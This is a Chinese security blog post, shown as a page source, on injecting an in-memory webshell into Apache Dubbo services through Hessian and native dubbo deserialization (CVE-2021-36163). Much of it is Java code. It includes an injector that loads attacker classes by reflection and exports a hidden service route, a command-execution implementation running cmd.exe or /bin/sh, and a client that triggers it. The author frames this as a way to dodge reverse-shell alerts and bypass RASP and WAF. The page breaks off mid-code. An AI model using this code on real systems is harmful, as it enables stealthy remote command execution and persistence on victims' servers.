@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+<title>dubbo中使用hessian_http/dubbo协议注入内存马 - J1anFen &#39; blog</title>
+<meta name="keywords" content="hexo,hexone">
+<meta name="description" content="a theme based on bootstrap">
+<meta name="author" content="John Doe">
+<meta name="generator" content="hexo">
+<meta name="jsonContent" content="/content.json">
+
+<link rel="alternate" href="/atom.xml" title="J1anFen ' blog">
+
+<!-- Bootstrap -->
+<link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<link rel="stylesheet" href="/css/style.css">
+
+  <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+    <script src="https://cdn.bootcss.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
+  <![endif]-->
+<link rel="alternate" href="/atom.xml" title="J1anFen ' blog" type="application/atom+xml">
+</head>
+<body class="bg">
+  <div class="container">
+    <header id="header" class="header">
+    <div class="site-info hidden-xs">
+        <p class="title">J1anFen &#39; blog</p>
+        <p></p>
+        <p class="lead">Information is beautiful</p>
+        <!--<p class="subtitle">Information is beautiful</p>-->
+        <!--<p class="author">by John Doe</p>-->
+    </div>
+    <div class="nav-box">
+        <nav id="navbar" class="navbar navbar-inverse">
+            <div class="navbar-inner">
+                <div class="container">
+                    <!-- Brand and toggle get grouped for better mobile display -->
+                    <div class="navbar-header">
+                        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#hexone-navbar-collapse" aria-expanded="false">
+                            <span class="sr-only">Toggle navigation</span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                        </button>
+                        <a href="/" class="navbar-brand visible-xs-inline">J1anFen &#39; blog</a>
+                    </div>
+
+                    <!-- Collect the nav links, forms, and other content for toggling -->
+                    <div class="collapse navbar-collapse">
+                        <ul class="nav navbar-nav">
+                            
+                                
+                                    <li class><a href="/">首页</a></li>
+                                
+                                <li class="divider-vertical"></li>
+                            
+                                
+                                    <li class><a href="/archives">归档</a></li>
+                                
+                                <li class="divider-vertical"></li>
+                            
+                                
+                                    <li class><a href="/about.html">关于</a></li>
+                                
+                                <li class="divider-vertical"></li>
+                            
+                                
+                                    <li class="active"><a>dubbo中使用hessian_http/dubbo协议注入内存马</a></li>
+                                
+                                <li class="divider-vertical"></li>
+                            
+                        </ul>
+                    </div>
+                </div><!-- /.navbar-collapse -->
+            </div><!-- /.container-fluid -->
+        </nav>
+    </div>
+</header>
+    <div class="row">
+      <section id="main" class="col-md-9 main">
+<article id="post-渗透测试/dubbo注入内存马" class="article">
+  
+    <h1 class="title"><a href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/dubbo%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/">dubbo中使用hessian_http/dubbo协议注入内存马</a></h1>
+  
+    <p class="info">
+  <span class="info-item">日期: <a href="/archives/2021/10" class="date" title="14:18:59">2021-10-05</a></span>
+  <span class="info-item">更新: <a href="javascript: void(0)" class="date" title="15:23:01">2021-10-05</a></span>
+  <span class="info-item">分类: <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span>
+</p>
+  
+    <div class="content">
+  <p>学习源码顺便玩玩内存马加深印象，比如某些环境不想触发反弹shell触发告警可以写入内存马方便快速操作（命令执行，文件管理，绕rasp,waf等）</p>
+<a id="more"></a>
+
+<h2 id="漏洞测试环境："><a href="#漏洞测试环境：" class="headerlink" title="漏洞测试环境："></a>漏洞测试环境：</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-094-096-apache-dubbo/" target="_blank" rel="external nofollow noopener noreferrer">https://securitylab.github.com/advisories/GHSL-2021-094-096-apache-dubbo/</a></p>
+<p>dubbo使用hessian协议对外暴露服务时触发反序列化漏洞<br>Issue 2: Unsafe deserialization in providers using the Hessian protocol (CVE-2021-36163/GHSL-2021-095)</p>
+<h2 id="代码环境："><a href="#代码环境：" class="headerlink" title="代码环境："></a>代码环境：</h2><p><a href="https://github.com/apache/dubbo-samples" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/apache/dubbo-samples</a><br>dubbo-sample-http</p>
+<p>基于CVE-2021-36163，http over hessian</p>
+<p>http-provider.xml 配置：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:registry</span> <span class="attr">address</span>=<span class="string">"zookeeper://$&#123;zookeeper.address:127.0.0.1&#125;:2181"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--  设置jetty或者tomcat服务器都可 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dubbo:protocol</span> <span class="attr">name</span>=<span class="string">"hessian"</span> <span class="attr">port</span>=<span class="string">"8085"</span> <span class="attr">server</span>=<span class="string">"jetty"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"demoService"</span> <span class="attr">class</span>=<span class="string">"org.apache.dubbo.samples.http.impl.DemoServiceImpl"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dubbo:service</span> <span class="attr">interface</span>=<span class="string">"org.apache.dubbo.samples.http.api.DemoService"</span> <span class="attr">ref</span>=<span class="string">"demoService"</span> <span class="attr">protocol</span>=<span class="string">"hessian"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="内存马前置知识"><a href="#内存马前置知识" class="headerlink" title="内存马前置知识"></a>内存马前置知识</h2><p>注入内存马无非就是修改关键变量中添加恶意的路由和对应的服务映射,所以一步步回溯寻找可修改关键变量的点是最主要的。</p>
+<h3 id="dubbo-SPI"><a href="#dubbo-SPI" class="headerlink" title="dubbo SPI"></a>dubbo SPI</h3><p><a href="https://blog.csdn.net/top_code/article/details/51934459" target="_blank" rel="external nofollow noopener noreferrer">https://blog.csdn.net/top_code/article/details/51934459</a></p>
+<p>dubbo中获取各种对象很多场景使用SPI(service provider interface) ，spi核心的作用就是解耦代码。用户直接调用接口即可直接调用实现代码，调用的最终实现从配置，远程等方式读取。</p>
+<p>单从上面链接中的例子看不出此模式的优势，举个栗子：比如某场景调用信息模块只需要调用接口代码即可获取信息，后端通过服务发现,webservice服务(Eureka,Feign)会将请求转发到其他模块执行，这样就完全进行了代码解耦。</p>
+<p>dubbo中到处都用到了SPI的调用方式，也对jdk原生的spi模式进行了优化,dubbo的扩展机制是dubbo实现扩展各种协议和各种反序列化方法的基础：<br><a href="https://dubbo.apache.org/zh/docsv2.7/dev/source/dubbo-spi/" target="_blank" rel="external nofollow noopener noreferrer">https://dubbo.apache.org/zh/docsv2.7/dev/source/dubbo-spi/</a></p>
+<h4 id="扩展加载器特点："><a href="#扩展加载器特点：" class="headerlink" title="扩展加载器特点："></a>扩展加载器特点：</h4><p>dubbo会将所有待被使用的扩展均缓存然后按需调用，所以代码中会经常看到如下类似代码:</p>
+<ul>
+<li><p>从接口加载指定名称实例:</p>
+<p>#getExtension </p>
+</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExtensionLoader.getExtensionLoader(Protocol.class).getExtension("hessian")</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>自适应(adaptive)</li>
+</ul>
+<p>决定要注入的目标扩展。 目标扩展的名称由 URL 中传递的参数决定，参数名称由该方法给出。<br>Decide which target extension to be injected. The name of the target extension is decided by the parameter passed in the URL, and the parameter names are given by this method.</p>
+<p>比如接口Protocol中export和refer就存在@Adaptive注解,可以根据url设置的协议动态选择协议:</p>
+<p>dubbo:// hessian:// rmi://,</p>
+<p>@SPI(“dubbo”)默认为dubboProtocol协议：<br><img src="/images/2021/10/20210930002003069_1999676093.png" alt></p>
+<p><a href="https://github.com/YunaiV/dubbo/blob/6b8e51ac55880a0f10a34f297d0869fcdbb42369/dubbo-common/src/main/java/com/alibaba/dubbo/common/extension/Adaptive.java" target="_blank" rel="external nofollow noopener noreferrer">@adaptive</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExtensionLoader.getExtensionLoader(Protocol<span class="class">.<span class="keyword">class</span>).<span class="title">getAdaptiveExtension</span>()</span></span><br></pre></td></tr></table></figure>
+
+
+<ul>
+<li>自激活(active)<br>内存马无需用到这部分知识，忽略。</li>
+</ul>
+<h2 id="内存马注入"><a href="#内存马注入" class="headerlink" title="内存马注入"></a>内存马注入</h2><p>通过断点发现 org.apache.dubbo.rpc.protocol.hessian.HessianProtocol.HessianHandler#handle：<br>skeletonMap中存在路由和调用方法对应关系，所以寻找可以修改skeletonMap参数的点即可：</p>
+<p><img src="/images/2021/10/20210930004559595_437019501.png" alt></p>
+<p>skeletonMap.put下断点一路回溯看是否存在静态对象可获取最终修改skeletonMap：<br><img src="/images/2021/10/20210930004851977_592680567.png" alt></p>
+<p>最终发现dubbo通过PROTOCOL对象进行export方法调用最终会触发修改skeletonMap，此时可以看出PROTOCOL是通过spi方式调用接口获取的自适应扩展：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Protocol PROTOCOL = (Protocol)ExtensionLoader.getExtensionLoader(Protocol<span class="class">.<span class="keyword">class</span>).<span class="title">getAdaptiveExtension</span>()</span>;</span><br></pre></td></tr></table></figure>
+
+
+<p>参考以下代码:<br>org/apache/dubbo/dubbo/2.7.10/dubbo-2.7.10.jar!/org/apache/dubbo/config/ServiceConfig.class:424</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Invoker&lt;?&gt; invoker = PROXY_FACTORY.getInvoker(<span class="keyword">this</span>.ref, <span class="keyword">this</span>.interfaceClass, registryURL.addParameterAndEncoded(<span class="string">"export"</span>, url.toFullString()));</span><br><span class="line">DelegateProviderMetaDataInvoker wrapperInvoker = <span class="keyword">new</span> DelegateProviderMetaDataInvoker(invoker, <span class="keyword">this</span>);</span><br><span class="line">Exporter&lt;?&gt; exporter = PROTOCOL.export(wrapperInvoker);</span><br><span class="line"><span class="keyword">this</span>.exporters.add(exporter);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>jndi反序列化时代码，将接口和实现类base64编码通过defineClass加载，最终export：</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.dubbo.common.URL;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.common.bytecode.Proxy;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.common.extension.ExtensionLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.common.utils.ClassUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.rpc.Invoker;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.rpc.Protocol;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.rpc.ProxyFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MemInject</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">"sun.misc.BASE64Decoder"</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">byte</span>[]) clazz.getMethod(<span class="string">"decodeBuffer"</span>, String<span class="class">.<span class="keyword">class</span>).<span class="title">invoke</span>(<span class="title">clazz</span>.<span class="title">newInstance</span>(), <span class="title">str</span>)</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">"java.util.Base64"</span>);</span><br><span class="line">            Object decoder = clazz.getMethod(<span class="string">"getDecoder"</span>).invoke(<span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">byte</span>[]) decoder.getClass().getMethod(<span class="string">"decode"</span>, String<span class="class">.<span class="keyword">class</span>).<span class="title">invoke</span>(<span class="title">decoder</span>, <span class="title">str</span>)</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MemInject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取hessianProtocol对象</span></span><br><span class="line">            Protocol protocolObj = ExtensionLoader.getExtensionLoader(Protocol.class).getExtension("hessian");</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建路由规则 x.x.x.x:8085/sb</span></span><br><span class="line">            URL url = <span class="keyword">new</span> URL(<span class="string">"hessian"</span>, <span class="string">"0.0.0.0"</span>, <span class="number">8085</span>, <span class="string">"sb"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取ProxyFactory对象最终需要生成invoker对象</span></span><br><span class="line">            ProxyFactory proxyFactoryObj = ExtensionLoader.getExtensionLoader(ProxyFactory<span class="class">.<span class="keyword">class</span>).<span class="title">getAdaptiveExtension</span>()</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 恶意类，接口加载</span></span><br><span class="line">            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]&#123;byte[].class, int.class, int.class&#125;);</span><br><span class="line">            defineClassMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 替换为base64编码的类和接口字符串</span></span><br><span class="line">            String extendServiceStr = <span class="string">"[extendService_interface_code]"</span>;</span><br><span class="line">            String extendServiceImpl = <span class="string">"[extendServiceImpl_code]"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 生成字节码</span></span><br><span class="line">            <span class="keyword">byte</span>[] extServiceBytes = base64Decode(extendServiceStr);</span><br><span class="line">            <span class="keyword">byte</span>[] extServiceImplBytes = base64Decode(extendServiceImpl);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 使用dubbo原生获取classloader方法，由于dubbo中使用代理类会出现同时加载一个类，如果使用不同类加载器则会抛出错误</span></span><br><span class="line">            ClassLoader proxyClassLoader = ClassUtils.getClassLoader(Proxy<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">            Class extServiceClazz = (Class) defineClassMethod.invoke(proxyClassLoader, <span class="keyword">new</span> Object[]&#123;extServiceBytes, <span class="keyword">new</span> Integer(<span class="number">0</span>), <span class="keyword">new</span> Integer(extServiceBytes.length)&#125;);</span><br><span class="line">            Class extServiceImplClazz = (Class) defineClassMethod.invoke(proxyClassLoader, <span class="keyword">new</span> Object[]&#123;extServiceImplBytes, <span class="keyword">new</span> Integer(<span class="number">0</span>), <span class="keyword">new</span> Integer(extServiceImplBytes.length)&#125;);</span><br><span class="line"></span><br><span class="line">            Invoker evilInvoker = proxyFactoryObj.getInvoker(extServiceImplClazz.newInstance(), extServiceClazz, url);</span><br><span class="line"></span><br><span class="line">            protocolObj.export(evilInvoker);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>恶意接口和实现类：</p>
+<ul>
+<li>DemoService：</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">DemoService</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">cmd</span><span class="params">(String c)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DemoServiceImpl:</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoServiceImpl</span> <span class="keyword">implements</span> <span class="title">DemoService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">cmd</span><span class="params">(String c)</span> </span>&#123;</span><br><span class="line">        String result = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String[] cmd = System.getProperty(<span class="string">"os.name"</span>).toLowerCase().contains(<span class="string">"windows"</span>) ? <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, c&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, c&#125;;</span><br><span class="line">            result = <span class="keyword">new</span> java.util.Scanner(<span class="keyword">new</span> ProcessBuilder(cmd).start().getInputStream()).useDelimiter(<span class="string">"\\A"</span>).next();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            result = e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>客户端调用之前设置的接口方法,即可触发注入的内存马：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.caucho.hessian.client.HessianProxyFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HessianRequest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String urlName = <span class="string">"http://127.0.0.1:8085/sb"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException </span>&#123;</span><br><span class="line">        HessianProxyFactory factory = <span class="keyword">new</span> HessianProxyFactory();</span><br><span class="line">        <span class="comment">// 开启方法重载</span></span><br><span class="line">        factory.setOverloadEnabled(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        HelloHessian helloHession = (HelloHessian) factory.create(</span><br><span class="line">                HelloHessian<span class="class">.<span class="keyword">class</span>, <span class="title">urlName</span>)</span>;</span><br><span class="line"></span><br><span class="line">        String result = helloHession.cmd(<span class="string">"ifconfig"</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="dubbo原生协议注入内存马"><a href="#dubbo原生协议注入内存马" class="headerlink" title="dubbo原生协议注入内存马"></a>dubbo原生协议注入内存马</h2><p>dubbo版本小于 2.7.6</p>
+<p>dubbo provider.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:protocol</span> <span class="attr">name</span>=<span class="string">"dubbo"</span> <span class="attr">port</span>=<span class="string">"20880"</span> <span class="attr">host</span>=<span class="string">"127.0.0.1"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>20880端口反序列化注入同理：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.common.URL;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.common.bytecode.ClassGenerator;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.common.extension.ExtensionLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.common.utils.ClassUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.rpc.Exporter;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.rpc.Invoker;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.rpc.Protocol;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.rpc.ProxyFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.rpc.protocol.dubbo.DubboExporter;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.rpc.protocol.dubbo.DubboProtocol;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MemInjectDubbo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">"sun.misc.BASE64Decoder"</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">byte</span>[]) clazz.getMethod(<span class="string">"decodeBuffer"</span>, String<span class="class">.<span class="keyword">class</span>).<span class="title">invoke</span>(<span class="title">clazz</span>.<span class="title">newInstance</span>(), <span class="title">str</span>)</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">"java.util.Base64"</span>);</span><br><span class="line">            Object decoder = clazz.getMethod(<span class="string">"getDecoder"</span>).invoke(<span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">byte</span>[]) decoder.getClass().getMethod(<span class="string">"decode"</span>, String<span class="class">.<span class="keyword">class</span>).<span class="title">invoke</span>(<span class="title">decoder</span>, <span class="title">str</span>)</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MemInjectDubbo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 由于代理类中存在wrapper所以getExtension获取的为QosWrapperProcotol，此时需要获取内部filed中被嵌套的真实dubboProtocol</span></span><br><span class="line">            Protocol protocolObj = ExtensionLoader.getExtensionLoader(Protocol.class).getExtension("dubbo");</span><br><span class="line">        <span class="comment">// 设置查询DubboProtocol次数，超过4次则跳出，避免无限查询</span></span><br><span class="line">            <span class="keyword">int</span> i = <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                i--;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Field protocolField = protocolObj.getClass().getDeclaredField(<span class="string">"protocol"</span>);</span><br><span class="line">                    protocolField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    protocolObj = (Protocol) protocolField.get(protocolObj);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    ;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">while</span> (protocolObj.getClass() != DubboProtocol<span class="class">.<span class="keyword">class</span> || <span class="title">i</span> &lt; 0)</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 设置端口和调用类名</span></span><br><span class="line">            URL dubboURL = <span class="keyword">new</span> URL(<span class="string">"dubbo"</span>, <span class="string">"0.0.0.0"</span>, <span class="number">20880</span>, <span class="string">"x.extendService"</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 获取jdk原生ProxyFactory, 避免其他扩展其他代码干扰比如javassistProxyFactory会在生成代码时干扰代码逻辑</span></span><br><span class="line">            ProxyFactory proxyFactoryObj = ExtensionLoader.getExtensionLoader(ProxyFactory.class).getExtension("jdk");</span><br><span class="line"></span><br><span class="line">            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]&#123;byte[].class, int.class, int.class&#125;);</span><br><span class="line">            defineClassMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 替换为自己想注入的类</span></span><br><span class="line">            String extendServiceStr = <span class="string">"[base64_classbytes]"</span>;</span><br><span class="line">            String extendServiceImpl = <span class="string">"[base64_classbytes]"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] extServiceBytes = base64Decode(extendServiceStr);</span><br><span class="line">            <span class="keyword">byte</span>[] extServiceImplBytes = base64Decode(extendServiceImpl);</span><br><span class="line"></span><br><span class="line">            ClassLoader proxyClassLoader = ClassUtils.getClassLoader(ClassGenerator<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">            Class extServiceClazz = (Class) defineClassMethod.invoke(proxyClassLoader, <span class="keyword">new</span> Object[]&#123;extServiceBytes, <span class="keyword">new</span> Integer(<span class="number">0</span>), <span class="keyword">new</span> 